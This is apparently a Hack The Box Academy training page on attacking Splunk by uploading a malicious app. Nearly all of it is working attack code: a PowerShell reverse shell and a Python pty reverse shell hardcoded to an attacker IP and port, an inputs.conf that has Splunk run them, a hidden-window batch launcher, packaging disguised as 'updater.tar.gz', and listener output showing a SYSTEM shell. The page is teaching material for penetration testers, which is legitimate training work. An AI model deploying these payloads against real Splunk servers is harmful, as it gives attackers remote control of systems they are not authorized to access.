<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/113/section/1213
// Platform Version: V1
// Module ID: 113
// Module Name: Attacking Common Applications
// Module Difficulty: Medium
// Section ID: 1213
// Section Title: Attacking Splunk
// Page Title: Hack The Box - Academy
// Page Number: 14
-->

# Attacking Splunk

**Module Name:** Attacking Common Applications **Page Number:** 14

#### 

#### ATTACKING COMMON APPLICATIONS

# Attacking Splunk

## Abusing Built-In Functionality

``` shell-session
[!bash!]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

``` powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

``` shell-session
[!bash!]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

``` shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

``` shell-session
[!bash!]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

![https://academy.hackthebox.com/storage/modules/113/install_app.png](https://academy.hackthebox.com/storage/modules/113/install_app.png)

``` shell-session
[!bash!]$ sudo nc -lnvp 443

listening on [any] 443 ...
```

![https://academy.hackthebox.com/storage/modules/113/upload_app.png](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

``` shell-session
[!bash!]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

``` python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

# 

# 

#### Questions

####